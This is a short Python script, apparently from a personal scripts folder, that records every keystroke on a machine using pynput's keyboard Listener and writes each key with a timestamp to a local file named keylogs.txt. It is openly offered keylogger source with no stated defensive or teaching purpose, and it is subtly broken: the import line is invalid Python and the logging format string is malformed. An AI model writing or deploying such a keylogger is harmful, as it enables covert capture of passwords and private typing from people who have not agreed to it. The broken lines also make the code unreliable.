# python_scripts

# This script is use for storing the hits key on the keyboard by the user.

import pynput.keyboard import Key, Listener
import logging
log_dir=""
logging.basicConfig(filename=(log_dir+ "keylogs.txt"), level=logging.DEBUG, format='%(asctime)s: % (message)s')

def on_press(key):
    logging.info(str(key))
with Listener (on_press=on_press) as listener:
    listener.join()
